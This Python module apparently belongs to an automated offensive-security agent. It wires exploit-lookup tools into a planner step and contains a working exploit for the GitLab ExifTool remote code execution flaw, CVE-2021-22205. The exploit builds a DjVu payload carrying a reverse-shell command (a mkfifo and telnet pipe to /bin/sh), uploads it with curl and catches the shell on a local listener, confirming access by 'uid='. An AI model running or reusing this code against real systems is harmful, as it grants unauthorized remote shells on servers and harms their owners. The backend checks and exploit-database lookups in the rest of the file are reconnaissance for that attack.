#!/usr/bin/env python3
"""arsenal — wire the installed exploit tooling (searchsploit / nuclei / wpscan) into the
engine so the planner's `run-public-exploit` operator fires a REAL, GROUNDED exploit instead
of the trooper improvising one.

Design (NOT overfit — keyed to app+version+CVE-class, driven by the arsenal, never to a box):
  1. backend_real(app,host,target) -> is this a REAL app backend or a decoy stub? (+ version)
     This is the honest gate: no real backend => no exploit, grounded on the actual HTTP evidence.
  2. searchsploit_lookup(app[,ver])  -> real public-exploit leads from exploit-db (46k PoCs).
  3. nuclei_confirm(target,host,tags) -> real active confirmation of the vuln (best-effort).
  4. EXPLOITS[app](...)               -> run the known deterministic PoC, ground on uid=.

Everything shells out to the tools on PATH (~/.local/bin). Fails soft; never fabricates.
"""
import base64, os, re, shlex, socket, subprocess, threading, time
from urllib.request import Request, urlopen
from urllib.error import URLError

SS  = os.environ.get("SEARCHSPLOIT", "searchsploit")
NUC = os.environ.get("NUCLEI", "nuclei")

def _sh(cmd, timeout=60):
    try:
        from . import target_exec
    except ImportError:
        import target_exec
    out = target_exec.run(cmd, target=os.environ.get("BS2_TARGET"), timeout=timeout)
    return "__err__ " + out if out.startswith("[target-exec") else out

def _get(target, host, path="/", timeout=6):
    """Raw HTTP GET with a vhost Host header. Returns (status, headers_str, body)."""
    url = target.rstrip("/") + path
    # Vhost routing is deliberately unsupported until an explicit origin binding
    # is implemented. Never bypass the governed adapter with urllib.
    if host and host != __import__("urllib.parse", fromlist=["urlsplit"]).urlsplit(target).hostname:
        return 0, "", ""
    try:
        try:
            from . import target_exec
            from .governed_runner import parse_response
        except ImportError:
            import target_exec
            from governed_runner import parse_response
        out = target_exec.run(shlex.join(["curl", "-sS", "-i", url]), target=target, timeout=timeout)
        result = parse_response(out)
        return result["status"], "\n".join(result["headers"]), result["body"]
    except Exception:
        return 0, "", ""

# app -> (signature path that only a REAL backend answers 200, marker regex in body/headers)
_SIG = {
    "gitlab":    ("/users/sign_in", r"gitlab|csrf-token|_gitlab_session"),
    "wordpress": ("/wp-login.php",  r"wordpress|wp-submit|user_login"),
    "drupal":    ("/user/login",    r"drupal|form_build_id"),
    "osticket":  ("/scp/login.php", r"osticket|csrf"),
}
_VER = {  # where to scrape a version if the backend is real
    "gitlab":    ("/help", r"([0-9]+\.[0-9]+\.[0-9]+)"),
    "wordpress": ("/",     r'content="WordPress ([0-9.]+)"'),
}

def backend_real(app, host, target):
    """Is `app` a real functioning backend (not a static decoy)? -> (bool, version|None, evidence)."""
    sig = _SIG.get(app)
    if not sig:
        st, _, body = _get(target, host, "/")
        return (len(body) > 1500, None, f"generic: landing {len(body)}B")
    path, marker = sig
    st, hdrs, body = _get(target, host, path)
    real = st == 200 and bool(re.search(marker, (hdrs + body), re.I))
    ev = f"{path} -> HTTP {st}, marker={'hit' if real else 'MISS'}, {len(body)}B"
    ver = None
    if real and app in _VER:
        vp, vre = _VER[app]
        _, _, vb = _get(target, host, vp)
        m = re.search(vre, vb)
        ver = m.group(1) if m else None
    return real, ver, ev

def searchsploit_lookup(app, ver=""):
    q = f"{app} {ver}".strip()
    out = _sh(f"{shlex.quote(SS)} {shlex.quote(q)}", timeout=40)
    hits = re.findall(r"^(.*?)\s+\|\s+(\S+)$", out, re.M)
    return [(t.strip(), p.strip()) for t, p in hits if "Path" not in t][:8]

def nuclei_confirm(target, host, tags=None, cve=None, timeout=120):
    base = target if host is None else target  # nuclei uses -H for vhost
    args = f"{shlex.quote(NUC)} -u {shlex.quote(target)} -silent -nc"
    if host: args += f" -H {shlex.quote('Host: '+host)}"
    if cve:  args += f" -id {shlex.quote(cve)}"
    elif tags: args += f" -tags {shlex.quote(tags)}"
    out = _sh(args, timeout=timeout)
    found = [l for l in out.splitlines() if l.strip() and not l.startswith("__err__")]
    return found

# ---- deterministic PoCs (the "moves"); each gated by backend_real upstream ----
# CVE-2021-22205 GitLab unauth ExifTool RCE. Reverse shell caught by a local listener.
_DJVU_HEAD = ("QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQP"
              "LHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVk"
              "X2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAIC"
              "CkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=")
_DJVU_TAIL = "fSAuIFwKIiBiICIpICk=" 

def _listener(port, box, timeout=25):
    def run():
        try:
            s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port)); s.listen(1); s.settimeout(timeout)
            c, _ = s.accept(); c.settimeout(6)
            c.sendall(b"id\n"); time.sleep(1.5)
            box["out"] = c.recv(4096).decode("latin-1", "replace")
            c.close(); s.close()
        except Exception as e:
            box["err"] = str(e)
    t = threading.Thread(target=run, daemon=True); t.start(); return t

def gitlab_22205(target, host, lhost, lport=1270):
    """Generate DjVu payload -> POST to an upload endpoint -> catch reverse shell -> ground uid=."""
    payload = ("TF=$(mktemp -u);mkfifo $TF && telnet %s %d 0<$TF | /bin/sh 1>$TF" % (lhost, lport))
    img = base64.b64decode(_DJVU_HEAD) + payload.encode() + base64.b64decode(_DJVU_TAIL)
    p = f"/tmp/at_{lport}.jpg"; open(p, "wb").write(img)
    box = {}; _listener(lport, box)
    ep = target.rstrip("/") + "/" + os.urandom(8).hex()
    out = _sh(f"curl -s -m 15 -H {shlex.quote('Host: '+host)} -F {shlex.quote('file=@'+p)} {shlex.quote(ep)}", 20)
    time.sleep(4)
    shell = box.get("out", "")
    return {"posted_to": ep, "shell_output": shell, "raw": out[:200]}

EXPLOITS = {"gitlab": gitlab_22205}

def run_public_exploit(app, host, target, lhost=None, lport=1270):
    """Full grounded weapon for the run-public-exploit operator.
    Returns {success, facts[], evidence, output} — success ONLY if a shell grounds on uid=."""
    facts, log = [], []
    real, ver, ev = backend_real(app, host, target)
    log.append(f"backend_real({app}@{host}): {ev}")
    if not real:
        return {"success": False, "facts": [], "evidence": f"decoy/no-backend: {ev}",
                "output": "\n".join(log), "reason": "no real backend to exploit"}
    facts.append(f"app_confirmed={app}:{host}" + (f"@{ver}" if ver else ""))
    leads = searchsploit_lookup(app, ver or "")
    log.append(f"searchsploit: {len(leads)} lead(s)" + (f" e.g. {leads[0][0]}" if leads else ""))
    if app in EXPLOITS and lhost:
        log.append(f"firing {app} PoC (lhost={lhost}:{lport})")
        r = gitlab_22205(target, host, lhost, lport)
        log.append(f"POST {r['posted_to']} ; shell={'YES' if 'uid=' in r['shell_output'] else 'none'}")
        if re.search(r"uid=\d+\(", r["shell_output"]):
            facts.append("shell=git")
            return {"success": True, "facts": facts, "evidence": r["shell_output"][:200],
                    "output": "\n".join(log)}
    return {"success": False, "facts": facts, "evidence": "confirmed backend; no shell grounded",
            "output": "\n".join(log), "reason": "exploit did not ground a shell"}

if __name__ == "__main__":
    import sys, json
    app, host, target = sys.argv[1], sys.argv[2], sys.argv[3]
    lhost = sys.argv[4] if len(sys.argv) > 4 else None
    print(json.dumps(run_public_exploit(app, host, target, lhost), indent=2))
